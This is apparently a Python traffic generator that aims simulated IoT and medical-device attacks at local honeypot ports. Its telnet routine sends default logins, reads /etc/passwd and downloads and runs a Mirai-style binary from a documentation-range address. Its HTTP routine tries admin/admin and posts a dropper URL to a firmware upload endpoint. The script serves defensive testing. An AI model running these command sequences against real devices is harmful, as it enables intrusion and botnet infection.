from __future__ import annotations

import http.client
import socket
import time
from urllib.parse import urlencode


HOST = "127.0.0.1"
PORTS = {
    "ssh": 2222,
    "telnet": 2223,
    "http": 8081,
    "mqtt": 1883,
    "dicom": 2104,
}


def recv_some(sock: socket.socket) -> bytes:
    sock.settimeout(1.5)
    try:
        return sock.recv(4096)
    except TimeoutError:
        return b""


def telnet_attack() -> None:
    commands = [
        "root",
        "admin",
        "uname -a",
        "cat /etc/passwd",
        "ifconfig",
        "wget http://203.0.113.50/mirai.arm -O /tmp/.x",
        "chmod +x /tmp/.x; /tmp/.x",
        "exit",
    ]
    with socket.create_connection((HOST, PORTS["telnet"]), timeout=3) as sock:
        recv_some(sock)
        for command in commands:
            sock.sendall(command.encode("utf-8") + b"\r\n")
            time.sleep(0.15)
            recv_some(sock)


def ssh_probe() -> None:
    with socket.create_connection((HOST, PORTS["ssh"]), timeout=3) as sock:
        recv_some(sock)
        sock.sendall(b"SSH-2.0-libssh_0.9.6\r\n")


def http_attack() -> None:
    conn = http.client.HTTPConnection(HOST, PORTS["http"], timeout=3)
    conn.request("GET", "/")
    conn.getresponse().read()
    body = urlencode({"username": "admin", "password": "admin"})
    conn.request("POST", "/login.cgi", body=body, headers={"Content-Type": "application/x-www-form-urlencoded"})
    conn.getresponse().read()
    body = urlencode({"url": "http://203.0.113.99/dropper.sh"})
    conn.request("POST", "/firmware/upload", body=body, headers={"Content-Type": "application/x-www-form-urlencoded"})
    conn.getresponse().read()
    conn.close()


def mqtt_probe() -> None:
    packet = b"\x10\x16\x00\x04MQTT\x04\x02\x00<\x00\nmed-pump-7"
    with socket.create_connection((HOST, PORTS["mqtt"]), timeout=3) as sock:
        sock.sendall(packet)
        recv_some(sock)


def dicom_probe() -> None:
    packet = b"\x01\x00\x00\x50\x00\x01\x00\x00FAKE-DICOM-ASSOCIATE-MEDIMG"
    with socket.create_connection((HOST, PORTS["dicom"]), timeout=3) as sock:
        sock.sendall(packet)
        recv_some(sock)


def main() -> int:
    steps = [ssh_probe, telnet_attack, http_attack, mqtt_probe, dicom_probe]
    for step in steps:
        print(f"running {step.__name__}")
        step()
    print("demo traffic complete")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

